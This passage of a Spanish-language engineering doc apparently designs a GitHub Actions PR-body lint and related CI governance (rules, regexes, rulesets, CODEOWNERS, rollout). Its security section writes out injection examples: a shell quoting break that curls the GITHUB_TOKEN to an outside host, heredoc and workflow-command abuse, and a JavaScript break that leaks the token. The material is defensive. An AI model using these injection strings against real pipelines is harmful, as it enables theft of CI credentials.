| `R2` `section:*`             | 3 secciones nucleares: `Summary`, `Related Issue`, `How Has This Been Tested?` | **error** | ≥ 20 caracteres útiles **cada una**    | Fuerza la estructura que el template ya define                          | Bajos (si hay lockstep con el template)                                   |
| `R3` `placeholder-issue-ref` | Placeholder `Closes #` sin número                                              | **error** | 0 ocurrencias                          | Placeholder **determinista**: no depende de la interpretación del texto | Nulos                                                                     |
| `R4` `no-checkbox-checked`   | Al menos una casilla marcada                                                   | warn      | ≥ 1 `- [x]`                            | Señal de que el autor reaccionó al template                             | Medios-bajos (PRs de docs pueden no marcar nada aún)                      |
| `R5` `issue-reference`       | Referencia a issue en cualquier formato                                        | warn      | ≥ 1 `#\d+`                             | Trazabilidad issue ↔ PR                                                 | Altos (chore/CI/dependabot/forks sin permiso de issues) → **nunca error** |

**Pipeline de normalización** (6 pasos, en este orden — el orden importa: los comentarios HTML se
quitan primero para que R3 no los vea, ver P2.7):

1. Quitar comentarios HTML (`<!-- ... -->`).
2. Quitar líneas de casilla **sin marcar** (`- [ ]`, `* [ ]`, `+ [ ]`).
3. Quitar líneas de heading (`## ...`).
4. Quitar `Closes #` sin dígitos (palabras `close[sd]?|fix|resolve[sd]?` + `#` sin número).
5. Desenvolver casillas marcadas (`- [x] texto` → `- texto`).
6. Colapsar espacios (`\s+` → un espacio, trim).

```javascript
const stripHtmlComments = (s) => s.replace(/<!--[\s\S]*?-->/g, ' ');
const dropUncheckedTasks = (s) =>
  s.replace(/^[ \t]*[-*+][ \t]+\[[ \t]\][ \t]+.*(?:\r?\n|$)/gm, '');
const dropHeadingLines = (s) =>
  s.replace(/^[ \t]{0,3}#{1,6}[ \t]+.*(?:\r?\n|$)/gm, ' ');
const dropBareIssueRef = (s) =>
  s.replace(
    /\b(?:close[sd]?|fix(?:e[sd])?|resolve[sd]?)\b[ \t]*#(?![0-9])/gim,
    ' '
  );
const unwrapCheckedTasks = (s) =>
  s.replace(/^([ \t]*[-*+][ \t]+)\[[xX]\]/gm, '$1');
const collapseWs = (s) => s.replace(/\s+/g, ' ').trim();
```

**La prueba que mata `non-empty`** (medido sobre `.github/PULL_REQUEST_TEMPLATE.md`, ejecutado):

| Métrica                                                   | Valor                                                                                                                                                |
| --------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| Body crudo del template                                   | **1.134 caracteres**                                                                                                                                 |
| Body no-whitespace                                        | **929 caracteres**                                                                                                                                   |
| **Contenido útil tras normalizar**                        | **0 caracteres**                                                                                                                                     |
| Por sección (crudo → útil)                                | `Summary` 69→0 · `Type / Scope` 146→0 · `Related Issue` 96→0 · `How Has This Been Tested?` 211→0 · `Screenshots` 104→0 · `Pre-merge Checklist` 387→0 |
| Template con Summary relleno + `Closes #123` + 2 casillas | **95 caracteres útiles**                                                                                                                             |

⇒ `body.trim() !== ''` **pasa con el 100 % de los PRs** creados por la web UI teniendo **0 %** de
contenido: "non-empty" es teatro y produce assurance falsa (un check que pasa con el template vacío
es **peor que ninguno**). La diferencia entre ese check y R1 es **todo el valor** del gate.

**Descartado explícitamente** (y por qué):

- **Exigir las 6 secciones del template** — `Screenshots (if applicable)` es **explícitamente
  condicional**: exigirla genera falsos positivos estructurales en todo PR sin UI.
- **Exigir la checklist completa (5 casillas)** — entrena a marcar sin leer; valor nulo y FP muy altos.
- **Detectar "comentario HTML del template aún presente"** — los comentarios HTML **persisten** en el
  body crudo aunque el usuario rellene la sección, y su texto cambia con el template: sería un FP
  determinista más un acoplamiento frágil. La señal determinista es R3.

**Umbrales con precedente**: `google/langextract` exige **20** caracteres para su sección
`Problem Statement`; `qwen-code` exige **20** para `Validation`. De ahí el 40 global / 20 por
sección de R1/R2: cifras con precedente y suficientes para excluir "N/A" ruidoso sin exigir ensayos.

---

### P2.3: Seguridad — context.payload, jamás `${{ }}`

El runner **sustituye la expresión antes** de entregar el texto al intérprete: no hay escape ni
quoting posible; el valor del atacante **se convierte en código fuente**. Tres vectores, de menor a
mayor gravedad:

1. **Shell (`run:`)** — ruptura de quoting (`a"; curl "http://x?t=$GITHUB_TOKEN"; echo "`),
   `$(...)`, backticks, `;`/`&&`, saltos de línea y **ruptura de heredoc** (`EOF` +
   `echo "X=1" >> $GITHUB_ENV`, que permite inyectar variables de entorno del job).
2. **Workflow commands (`::`)** — el runner interpreta cualquier línea que empieza por `::` **fuera
   del shell**: `::error::` falsifica anotaciones, `::add-mask::` enmascara, y
   `::stop-commands::<token>` **desactiva** el procesamiento de comandos → silencia anotaciones.
   Ocurre incluso con un simple `echo "$BODY"` (sin ejecución de shell): **el log mismo es un canal
   de ataque**.
3. **`script:` de `github-script`** — aquí `${{ }}` se evalúa **como JavaScript**, no como shell. El
   README de la action lo dice explícitamente: las expresiones se evalúan _antes_ de pasar `script` y
   _"the result of any expressions will be evaluated as JavaScript code"_. Un body que contiene una
   backtick + `${process.env.GITHUB_TOKEN}` cierra el template literal del payload y **exfiltra el
   token** (que está en scope en `github-script`). Es el vector **más grave** de los tres.

| Patrón                                                             | Inyección shell                     | Inyección JS                               | Residuales                                                                                                                  | Veredicto                                  |
| ------------------------------------------------------------------ | ----------------------------------- | ------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| **`context.payload`** — leer `pull_request.body` dentro del módulo | No aplica (no hay shell)            | No aplica (es un valor JSON, nunca fuente) | Ninguno                                                                                                                     | ✅ **Canónico** — el de P2.1               |
| **`env:` intermedio** (`BODY: ${{ ... }}` + `"$BODY"`)             | Neutralizada con quoting estricto   | No aplica                                  | `::` en el log aún falsifica anotaciones; SC2086 si se olvidan comillas; el valor queda en el entorno del step (`printenv`) | ⚠️ Aceptable con residuales                |
| **Fichero** (`--body-file`)                                        | Neutralizada                        | Neutralizada                               | Paso extra de escritura + I/O                                                                                               | ⚠️ Correcto si además se reescribe el body |
| **Acción propia con input `with:`**                                | Neutralizada (argumento, no código) | Neutralizada                               | Exige publicar y mantener una action                                                                                        | ✅ Seguro, coste no justificado aquí       |

**Límite real del body: 65.536 caracteres** (64 KiB) — la API responde HTTP 422
`body is too long (maximum is 65536 characters)`. Los "8 MB" son el límite del **payload de
webhook**, no del body del PR. Consecuencia: el `env:` intermedio es viable por tamaño, pero sigue
siendo innecesario frente a `context.payload`.

**Regla operativa**: **nunca imprimir el body completo en el log** (ni truncado) — es input no
confiable y puede contener líneas `::` que el runner interpretaría como workflow commands.

---

### P2.4: Evidencia, failure UX y graduación

**Job summary** (lo que se ve en la pestaña del run):

- Encabezado + política aplicada: `≥40 caracteres útiles, 3 secciones obligatorias (≥20 cada una)`.
- Tabla **Regla / Resultado / Detalle** con `❌ fail` / `⚠️ warn` / `✅ pass` por regla.
- Sección **"Qué corregir"** (solo si hay fallos): lista `título → hint` accionable.

**Failure UX**:

- `core.setFailed` con mensaje accionable: conteo de problemas, lista `1. título → hint`, y el
  comando exacto de remediación `gh pr edit <n> --body-file <archivo-con-la-descripcion>` + la
  instrucción "edita la descripción y vuelve a ejecutar el workflow (o haz push)". El mensaje **no
  promete re-ejecución automática** (no hay trigger `edited` — ver P2.5).
- `core.warning` para R4/R5: no fallan el job, pero quedan visibles en el log y en el summary.
- **Outputs**: `verdict` (`pass`/`fail`), `failed_rules` (CSV de ids fallidos), `report_path`
  (`.tmp/pr-body-lint/report.json`).

**`report.json` — schema v1** (artifact `pr-body-lint-report`, retención 14 días):

```json
{
  "schemaVersion": 1,
  "generatedAt": "2026-10-20T00:00:00.000Z",
  "pr": {
    "number": 0,
    "author": "login",
    "draft": false,
    "headSha": "…",
    "baseSha": "…"
  },
  "policy": {},
  "metrics": {
    "bodyChars": 0,
    "meaningfulChars": 0,
    "checkedCheckboxes": 0,
    "sectionsFound": []
  },
  "failures": [],
  "warnings": [],
  "verdict": "pass"
}
```

**Compliance — marco honesto**:

| Marco                                                                                     | Qué aporta el body lint                                                                                                                                                        |
| ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **ISO/IEC 27001:2022 A.8.32** (change management) y **A.8.25-A.8.28** (desarrollo seguro) | **Sí**: evidencia de **documentación del cambio** y de trazabilidad issue ↔ PR — es su caso de uso legítimo                                                                    |
| **SOC 2 CC8.1** (autorización, diseño, test, aprobación, implementación)                  | **No es control de CC8.1**: autorización/test/aprobación ya los cubren el ruleset (1 review + CODEOWNERS + last-push) y los jobs de test; CC8.1 no exige "descripción rellena" |

- El artifact de **14 días** vive dentro de la **ventana de calibración**: es evidencia operativa,
  **no** evidencia de auditoría (14 d < ciclo de auditoría).
- El registro primario y durable es **el PR mismo** (body + check run + review):
  `gh pr view --json body,reviews,statusCheckRollup`. El job summary y el artifact son apoyo.
- No vender esto como "control de compliance": es **higiene de trazabilidad** + evidencia operativa.

**Graduación FASE 1 → 2 → 3**:

| Fase                  | Estado                     | Acción                                                                                                                                        |
| --------------------- | -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| **FASE 1**            | Advisory (esta referencia) | `continue-on-error: true` + artifact 14 d + wiring ADD-only                                                                                   |
| **FASE 2**            | Blocking                   | Quitar `continue-on-error: true` cuando se cumplan los 3 criterios del comentario del job (2 semanas, 0 FPs sin triar, evidencia en artifact) |
| **FASE 3** (opcional) | Required en ruleset        | Añadir `Governance: PR Body Lint` al ruleset 21227644 — **solo** con decisión de gobernanza explícita y tras resolver el staleness (P2.5)     |

> **Gotcha exact-string (futuro binding en FASE 3)**: el ruleset matchea por **cadena exacta** contra
> el `name:` del job. El contexto a enlazar sería `Governance: PR Body Lint`; renombrar el job tras
> hacerlo required rompe el binding **en silencio** y el PR queda
> `Expected — Waiting for status to be reported` (precedente documentado: los 4 checks de §3.2 de
> CONTEXT-CICD).

---

### P2.5: Staleness — el body editable

> **ADOPTADO (2026-10-20): la opción (b), workflow aparte.** `.github/workflows/pr-metadata.yml` dispara en
> `opened, edited, synchronize, reopened` + `merge_group` con `concurrency: pr-metadata-<n>` y
> `cancel-in-progress: false`, así que **corregir el body (o el título) sin hacer push re-valida el check en el
> mismo head SHA**. El hueco residual H7 no desaparece del todo: un merge puede aterrizar en los segundos entre la
> edición y el nuevo veredicto (design D10, riesgo aceptado y documentado).

**H7**: un check required está atado al **head SHA** del PR; editar el body **no mueve el SHA** ⇒ un
verde previo **sigue verde** aunque el autor vacíe la descripción después (documentado en
"Troubleshooting required status checks"). El hueco es **estructural** de cualquier check basado en
body, no un bug de este job.

| Opción                                                    | Descripción                                                                       | Pros                                             | Contras                               |
| --------------------------------------------------------- | --------------------------------------------------------------------------------- | ------------------------------------------------ | ------------------------------------- |
| **(a) Aceptar + control compensador**                     | El hueco queda documentado; la review humana/CODEOWNERS ve el body en cada review | Cero infraestructura; es el status quo de FASE 1 | Depende de que la review mire el body |
| **(b) Workflow aparte `pr-body-lint-edit.yml`** (FASE 2b) | `on: pull_request: types: [opened, edited, reopened]` — solo ese job (~6 s)       | Cierra el hueco sin tocar el monolito            | Un workflow más que mantener          |
| **(c) No requerirlo nunca en el ruleset**                 | El advisory nunca puede dar falso verde de merge                                  | Elimina el hueco por definición                  | No habrá gate blocking de body        |

**Por qué NO añadir `edited` al trigger de `ci.yml`** (razón estructural que motivó el workflow propio): `edited`
cubre body **y** título **y** retarget de base; re-ejecutaría **~45 jobs** (SAST con Docker, tests, lints…) en cada
edición, y el `concurrency` con `cancel-in-progress: true` **cancelaría el run en curso** del PR — editar un body
mataría una corrida verde legítima. `on:` y `concurrency` son workflow-scoped: la solución es el workflow aparte de
la opción (b), que es la que quedó implementada.

---

### P2.6: Bots, forks y drafts — matriz de skip

| Caso                                              | Detección / condición                                                                                                                                                                                       | Comportamiento                                                                                        |
| ------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| **Bots** (dependabot, changesets, release-please) | `context.payload.pull_request.user.type === 'Bot'` **o** `/\[bot\]$/i` sobre `user.login` — **nunca** `github.actor`, que es el triggerer (un maintainer editando un PR de bot cambia `actor`, no el autor) | Skip con `core.notice` + job summary "omitido"                                                        |
| **Forks**                                         | `GITHUB_TOKEN` **read-only** y sin secrets (hecho de GitHub)                                                                                                                                                | **Sin comentarios en el PR**: solo annotations (`setFailed`/`warning`), job summary y artifact        |
| **Drafts**                                        | `POLICY.skipDrafts = false` — corre siempre; `# TODO(adapt): true` en FASE 2 si se decide eximir drafts                                                                                                     | Igual que un PR normal (los drafts se crean con body)                                                 |
| **`merge_group`**                                 | Workflow declara `merge_group: {}` y las DOS jobs concluyen con un no-op explícito `if: merge_group` (D5); el job-level `if` del body excluye SOLO a autores bot, nunca a merge_group                       | Conclusión garantizada en la cola: un required check que no reporta bloquea la entrada de merge queue |
| **Body editable post-aprobación**                 | `edited` re-valida en el mismo head SHA (workflow propio); el residual (merge entre edición y veredicto) queda aceptado (D10)                                                                               | Ver P2.5 — hueco estructural reducido, aceptado y documentado                                         |
| **`gh pr create --fill` / `--body ""`**           | Reemplaza el template (**no** lo fusiona)                                                                                                                                                                   | Body vacío ⇒ R1+R2 fallan correctamente: es el caso real que el gate captura                          |

**Escape hatch**: **NO existe** — el label `skip-pr-body-lint` fue **rechazado explícitamente** (design D9): un
label lo puede aplicar cualquiera con acceso de escritura y deja solo un evento en la timeline, así que el
control se degradaría a una convención. La única exención efectiva es la **por autor bot** (fila «Bots») y el
único override humano es el **bypass actor del ruleset** (`RepositoryRole id 5`, modo `pull_request`),
auditable en el merge. El wrapper local `scripts/hooks/pr-title-check.js` (L2.5) valida el TÍTULO, no el body.

---

### P2.7: Testabilidad — módulo extraído + lockstep

El repo ya tiene el patrón de scripts testeables: `scripts/ci/*.mjs` + `scripts/ci/*.test.mjs` +
`vitest.scripts.config.js` (`include: ['scripts/ci/*.test.mjs', 'scripts/*.test.mjs']`) +
`npm run test:scripts` (precedentes: `check-coverage.mjs`, `tia-select.mjs`, `tia-map`, `tia-metric`,
`ttff-metric`, `vitest-sequencer`).

- **`scripts/ci/pr-body-lint.mjs`** — lógica pura sin dependencias de GitHub: `normalize` (pipeline
  de P2.2), `splitSections` + `canonHeading` (tolerante a case/puntuación), `evaluate` (R1-R5) y el
  orquestador que sí toca `core`/`context`.
- **`scripts/ci/pr-body-lint.test.mjs`** — unitarios de `normalize`/`splitSections`/`evaluate` +
  el test de lockstep de abajo.
- **Wrapper en el YAML** (P2.1): 3 líneas; requiere `actions/checkout@v5` (a diferencia de la
  variante inline, que podía prescindir de checkout).

**Test de lockstep — mitigación del riesgo #1 (template drift)**: lee el template real y exige que
cada sección obligatoria exista (canónicamente). Si alguien renombra un heading, el test falla en
CI **antes** de que el job emita falsos positivos masivos en producción:

```javascript
test('template lockstep: cada sección obligatoria existe en el template', () => {
  const tpl = readFileSync('.github/PULL_REQUEST_TEMPLATE.md', 'utf8');
  const headings = [...tpl.matchAll(/^##\s+(.+)$/gm)].map((m) => m[1].trim());
  for (const spec of POLICY.requiredSections) {
    expect(
      headings.some((h) => canonHeading(h) === canonHeading(spec.heading))
    ).toBe(true);
  }
});
```

**Gotchas del wrapper** (documentar junto al YAML):

- `github-script` envuelve el `script` en **CJS** y su `require` resuelve **relativo al cwd** ⇒
  `require('./scripts/ci/pr-body-lint.mjs')` funciona tras el checkout.
- `require(esm)` está soportado en Node 24 salvo **top-level await**
  (`ERR_REQUIRE_ASYNC_MODULE`): el módulo **no debe** usar TLA. Alternativa ESM puro:
  `await import(pathToFileURL(path.resolve(process.cwd(), 'scripts/ci/pr-body-lint.mjs')))`
  (el `script` es async, admite `await`).
- `github-script@v9` rompe `require('@actions/github')` — irrelevante aquí: **no se importa**.
- `process.getBuiltinModule('node:fs')` esquiva el proxy de `require` de la action (Node ≥22.3).

**🐞 Bug obligatorio antes de aterrizar el payload (R3)**: R3 debe ejecutarse sobre
`stripHtmlComments(body)`, **no** sobre el body crudo — el template contiene
`<!-- ... Use "Closes #<number>" ... -->` y ese placeholder **dentro de un comentario** produciría
un falso positivo en todo PR que use el template tal cual. Corrección de una línea:

```javascript
const bodyForPlaceholders = stripHtmlComments(body);
if (/\b(?:close[sd]?|fix(?:e[sd])?|resolve[sd]?)\b[ \t]*#(?![0-9])/im.test(bodyForPlaceholders)) {
```

(Con la corrección, el caso "template relleno" pasa de `fail` a `pass` — verificado en el harness.)

---

### Gotchas específicos de body validation

1. **`${{ }}` en `script:` es JavaScript**, no solo shell — la prohibición de interpolación cubre
   `github-script`, no solo `run:` (README de la action).
2. **`github.actor` ≠ autor del PR** — detectar bots por `pull_request.user.type`/`user.login`;
   `actor` es el triggerer (un maintainer editando un PR de bot lo cambia).
3. **Fork y Dependabot ⇒ token read-only** y sin secrets — no diseñar el gate con comentarios en el PR.
4. **`gh pr create --fill` reemplaza el template** (no lo fusiona) — los PRs de CLI/API son el caso
   real que el gate captura.
5. **`edited` en `ci.yml`** re-ejecuta ~45 jobs y `cancel-in-progress: true` cancela el run vivo.
6. **Check required + body editable = hueco por construcción** (el check está atado al SHA; H7).
7. **`require(esm)`**: `require('./x.mjs')` funciona en Node 24 salvo top-level await
   (`ERR_REQUIRE_ASYNC_MODULE`).
8. **`process.getBuiltinModule`** esquiva el proxy de `require` de `github-script`.
9. **`.tmp/` es un path oculto** ⇒ `include-hidden-files: true` obligatorio en
   `upload-artifact@v4+`.
10. **Límite real del body = 65.536 caracteres** (HTTP 422), **no** 8 MB (payload de webhook).

---

### P2: CODEOWNERS

**Ubicación**: `.github/CODEOWNERS`

```markdown
# Default: @Freelancer-soluctions/core-team

-                           @Freelancer-soluctions/core-team

# Client

apps/client/ @Freelancer-soluctions/frontend-team

# Server

apps/server/ @Freelancer-soluctions/backend-team

# CI/CD

.github/ @Freelancer-soluctions/devops-team
.github/workflows/ @Freelancer-soluctions/devops-team

# E2E

apps/e2e/ @Freelancer-soluctions/qa-team

# OpenSpec

openspec/ @Freelancer-soluctions/architects

# Learning docs

docs/learning/ @Freelancer-soluctions/core-team
```

**Función**: asegura que cada componente tenga reviewers especializados. Complementa la automatización de CI con review humana.

---

### P2: CONTRIBUTING.md

**Ubicación**: `CONTRIBUTING.md` (raíz del repo)

**Secciones clave**:

- **Commit Guidelines**: formato Conventional Commits, types, ejemplos
- **DCO Sign-off**: `git commit -s` obligatorio, exemption para bots
- **PR Title Format**: type(scope): description, types, scope examples
- **PR Template**: uso del template, secciones explicadas
- **Review Process**: CODEOWNERS, required checks, signed commits
- **Code Standards**: Frontend (React/Vite/Tailwind), Backend (Express/Prisma), Testing (Vitest/RTL/Playwright)

---

### Design Decisions — Estado Final

| Decision                                                        | Implementada | Notas                                                                          |
| --------------------------------------------------------------- | :----------: | ------------------------------------------------------------------------------ |
| D1: PR Title Lint + DCO tools (jobs separados)                  |      ✅      | amannn/action-semantic-pull-request@v6 + KineticCafe/actions-dco@v3.2.0        |
| D2: Squash setting PR_TITLE                                     |      ✅      | Verificado por API (PR_TITLE + COMMIT_MESSAGES)                                |
| D3: Body enforcement (contenido significativo, FASE 1 advisory) |      📋      | Documentado (P2.1-P2.7); job `pr-body-lint` pendiente de aterrizar en `ci.yml` |
| D4: CI pattern parallel/ADD-only                                |      ✅      | Agregadores por substage; CI_MINIMAL guard preservado                          |
| D5: Ruleset required checks                                     |      ✅      | 4 checks en ruleset 21227644 (required + blocking)                             |
| D6: Evidence (job summary + artifact 14d)                       |      ✅      | Patrón `sast-report` para la ventana de calibración                            |
| D7: Rollout continue-on-error → Active                          |      ✅      | Blocking desde 2026-08-31 (F2 alcanzada)                                       |
| D8: Merge queue neutral success                                 |      ✅      | Ambos jobs emiten success en merge_group                                       |

---

### Admin Actions Pendientes

#### Admin-1: Squash Setting

**Estado: HECHO** — verificado por API: `squash_merge_commit_title=PR_TITLE` y `squash_merge_commit_message=COMMIT_MESSAGES`. Se conserva el procedimiento como runbook.

**Cambiar** `squash_merge_commit_title` de `COMMIT_OR_PR_TITLE` → `PR_TITLE`.

**Por qué**: consistencia — PR title = squash subject en TODOS los casos. Con `COMMIT_OR_PR_TITLE`, single-commit PRs usan el commit message (commitlint), multi-commit usan PR title (PR Title Lint). Con `PR_TITLE`, siempre PR title.

**Cómo**:

1. GitHub → Settings → General → Pull Requests
2. Cambiar "Allow squash merging" → Default commit message → "Pull request title"
3. Verificar que `squash_merge_commit_message` sigue siendo `COMMIT_MESSAGES`

**Impacto**: single-commit PRs cuyo commit message es convencional pero PR title no → PR Title Lint falla. Esto es DESIRED — fuerza consistencia.

#### Admin-2: Ruleset Required Checks

**Registrar** `PR Title Lint` y `DCO` como required checks en ruleset 21227644.

**Estado**: hecho — los 4 checks ya están registrados (required + blocking desde 2026-08-31). El
procedimiento se conserva como runbook para checks futuros (p. ej. `Governance: PR Body Lint` en FASE 3).

**CRITICAL**: usar **GET → modify → PUT**, NO PATCH. PATCH borra todos los checks existentes.

```bash
# 1. GET current ruleset
gh api repos/{owner}/{repo}/rulesets/21227644

# 2. Modify: agregar PR Title Lint y DCO a required_checks
# (mantener Verify Commit Signatures y Commit Lint)

# 3. PUT full ruleset back
gh api repos/{owner}/{repo}/rulesets/21227644 -X PUT -d @ruleset.json
```

**Ruleset resultante** (estado hoy):

```
Required status checks:
  ├── Verify Commit Signatures            ← existing
  ├── Commit Lint (Conventional Commits)  ← existing
  ├── PR Title Lint                       ← registrado (2026-08-31)
  ├── DCO                                 ← registrado (2026-08-31)
  # Governance: PR Body Lint              ← futuro, FASE 3 — requiere decisión de gobernanza

Bypass actors: NONE
```

---

### Rollout Phases

```
Phase 1 (Week 1-2): COMPLETADO (histórico)
  ├── continue-on-error: true en ambos jobs (estado original del rollout)
  ├── Jobs corren, reportan pass/fail, NO bloquean merge
  ├── Equipo ve failures, ajusta workflow
  └── Admin-1 + Admin-2

Phase 2 (Week 3): ACTIVACIÓN — DONE (2026-08-31)
  ├── Remover continue-on-error de pr-title-lint y dco → HECHO (2026-08-31)
  ├── Admin-1: squash = PR_TITLE (hecho, verificado por API)
  ├── Admin-2: register checks in ruleset → HECHO (4 checks required + blocking)
  └── Required checks → blocking (desde 2026-08-31)

Phase 3 (Ongoing): MANTENIMIENTO
  ├── Monitorear false positives
  ├── Ajustar ignoreLabels si necesario
  └── Evolucionar CONTRIBUTING.md según feedback
```

> El body-lint (`Governance: PR Body Lint`) sigue su propio ciclo FASE 1 advisory → FASE 2 blocking
> (ver P2.4).

---

### Verification Report

| Dimension    | Estado                                                                              |
| ------------ | ----------------------------------------------------------------------------------- |
| Completeness | 7/7 tasks implementadas                                                             |
| Correctness  | Todos los acceptance criteria verificados                                           |
| Coherence    | Design decisions D1-D8 seguidas (0 admin pendientes; D3 documentado, job pendiente) |

**Issues encontrados durante verification**:

| #   | Severidad | Issue                                                                                          | Fix                                      |
| --- | --------- | ---------------------------------------------------------------------------------------------- | ---------------------------------------- |
| 1   | **HIGH**  | DCO job permissions: solo `contents: read` → HTTP 403 en Phase 2                               | `d92f89b`: agregar `pull-requests: read` |
| 2   | MEDIUM    | design.md D1: `subjectPattern` stale en config block (histórico: se reincorporó el 2026-08-31) | `d92f89b`: remover de design.md          |
| 3   | LOW       | design.md D4: count 30→32 desactualizado                                                       | `d92f89b`: actualizar a 32               |
| 4   | LOW       | CODEOWNERS: team slugs no verificables desde repo                                              | Verificar en GitHub org antes de confiar |

---

### Commits Totales (feat/ci-governance)

```
31d445f docs(ci): add PR template, CODEOWNERS, and CONTRIBUTING.md
d92f89b fix(ci): add pull-requests: read to DCO job permissions
a5fb76b docs(openspec): mark Tasks 1-7 acceptance criteria complete
cc400b4 fix(ci): fix malformed ignoreLabels YAML in pr-title-lint job
c3cc1c7 feat(ci): add PR Title Lint and DCO jobs with merge_group support
d8fdd6f fix(openspec): fix 5 critical planner issues in ci-pr-metadata-governance artifacts
577a443 docs(openspec): add ci-pr-metadata-governance change artifacts
128a0e8 docs(learning): add 05e PR metadata checks research brief
```

---

## ⚠️ Gotchas Enterprise

1. **Exact-name case-sensitive**: el `name:` del job debe coincidir EXACTAMENTE con el string registrado en el ruleset. Mismatch → deadlock de "Expected — waiting".
2. **Dependabot email mismatch**: author email es `+dependabot[bot]@users.noreply.github.com` pero sign-off es `support@github.com`. KineticCafe lo maneja; scripts custom necesitan whitelist explícita.
3. **Squash trailer loss**: si `squash_merge_commit_message` no es `COMMIT_MESSAGES`, los Signed-off-by se pierden. Verificar setting ANTES de activar DCO check.
4. **probot/dco está muerto**: no instalar la DCO App clásica. Usar `cncf/dco2` (App) o `KineticCafe/actions-dco` (Action).
5. **Zero-bypass ruleset**: dependabot, release-please, y otros bots generarán PRs que deben pasar los checks — whitelist OBLIGATORIO en las configs de los Actions.
6. **PR body**: GitHub pre-rellena el template en la web UI, así que un check "body no vacío" pasa siempre;
   hay que normalizar y exigir contenido significativo. Nunca interpolar
   `${{ github.event.pull_request.body }}` ni el title en `run:` NI en `script:` (en `script:` se evalúa
   como JavaScript → exfiltración de token).
7. **DCO permissions**: `KineticCafe/actions-dco` necesita `pull-requests: read` para enumerar commits. Solo
   `contents: read` → HTTP 403 silencioso (enmascarado por `continue-on-error` en Phase 1; hoy blocking).
8. **Ruleset PATCH destructivo**: `PATCH` en GitHub API rulesets BORRA todos los required checks. Siempre usar GET → modify → PUT.
9. **subjectPattern**: se reincorporó el 2026-08-31 (`^(?![A-Z]).+$`); rechaza mayúscula inicial pero
   permite acrónimos internos. Requiere `subjectPatternError` para que el fallo sea accionable.

---

## 📚 Referencias

| Recurso                             | URL                                                                                                                                                               |
| ----------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| KineticCafe/actions-dco             | <https://github.com/KineticCafe/actions-dco>                                                                                                                      |
| amannn/action-semantic-pull-request | <https://github.com/amannn/action-semantic-pull-request> (solo título; `wip`, `ignoreLabels`)                                                                     |
| CNCF dco2 App                       | <https://github.com/cncf/dco2>                                                                                                                                    |
| LF DCO Best Practices               | <https://bestpractices.linuxfoundation.org/ip/contribution-mechanisms-dco.html>                                                                                   |
| GitHub squash options (2022)        | <https://github.blog/changelog/2022-08-23-new-options-for-controlling-the-default-commit-message-when-merging-a-pull-request/>                                    |
| OpenSpec change                     | `openspec/changes/ci-pr-metadata-governance/`                                                                                                                     |
| CI/CD learning docs                 | [05a](./05a-ci-cd-pipeline-design.md) · [05b](./05b-github-actions-setup.md) · [05c](./05c-ssh-commit-signing.md) · [05d](./05d-ci-commit-lint-implementation.md) |
| GitHub security hardening (Actions) | <https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions>                                            |
| actions/github-script README        | <https://github.com/actions/github-script> (v9, "Passing inputs to the script", proxy de `require`)                                                               |
| `pull_request_target` secure use    | <https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target>                                                                        |
| Required status checks (staleness)  | <https://docs.github.com/en/pull-requests/how-tos/merge-and-close-pull-requests/troubleshooting-required-status-checks>                                           |
| Prow release-note / k8s docs        | <https://github.com/kubernetes-sigs/prow/blob/main/pkg/plugins/config.go> · <https://www.kubernetes.dev/docs/guide/release-notes/>                                |
| google/langextract workflow         | <https://github.com/google/langextract/blob/main/.github/workflows/validate_pr_template.yaml>                                                                     |
| external-secrets PR #6881           | <https://github.com/external-secrets/external-secrets/pull/6881> (patrón "validar y cerrar", 21 tests, zizmor)                                                    |
| danger-js                           | <https://github.com/danger/danger-js> (`danger@14.0.7`, Aug 2026, Snyk Health 85/100)                                                                             |
| Node `require(esm)`                 | <https://nodejs.org/api/modules.html#loading-ecmascript-modules-using-require> (`ERR_REQUIRE_ASYNC_MODULE`)                                                       |

---

## 🔮 Futuro: Enterprise Implementation Patterns (Para Profundizar)

> **Nota**: la implementación core está completa. Los siguientes temas merecen un deep-dive dedicado:
>
> - **CLA (Contributor License Agreement)**: cuándo DCO no es suficiente y se necesita CLA bilateral (patent grants, relicensing rights, copyright assignment). Comparación DCO vs CLA en escenarios de auditoría SOC2/ISO27001 real.
> - **Push rulesets para Signed-off-by**: regex en el commit message como defense-in-depth contra el squash-time stripping (requiere plan Team/Enterprise). Cómo configurar y rollout.
> - **CODEOWNERS patterns**: design patterns para ownership boundaries en monorepos (client/server/e2e). Integración con required reviewers.
> - **Automated compliance dashboards**: cómo exportar evidencia de DCO/title-lint/template-compliance para auditorías (GitHub API, audit log exports, SIEM integration).
> - **Multi-repo governance**: cómo escalar PR metadata checks a nivel organization (org-wide rulesets, shared Actions, reusable workflows).
> - **Patrones de Mantycore/MorganStanley/Netflix**: cómo empresas fintech/enterprise reales implementan DCO + CLA + CODEOWNERS como stack de compliance.
> - **Danger.js para reglas multi-archivo** (p. ej. validar que el diff toca tests) — descartado para
>   body: cubierto por el diseño de `pr-body-lint` (P2.1-P2.7; job aún no aterrizado) sin infraestructura extra.

---

## ➡️ Siguiente

> **Has completado el research brief + implementación de PR Metadata Checks** — junto con 05c (signing) y 05d (commit-lint), cubre las tres capas de gobernanza de commits: quién firma, cómo se escribe, y qué metadatos acompaña cada PR.
>
> **Estado actual**: implementación completa en `feat/ci-governance`. Blocking desde 2026-08-31.
> Admin-1 verificado por API; pendiente el change que aterrice `pr-body-lint` (P2.1-P2.7).

> **Índice**: [README Avanzado](./avanzado-README.md) · **Anterior**: [05d-ci-commit-lint-implementation.md](./05d-ci-commit-lint-implementation.md)
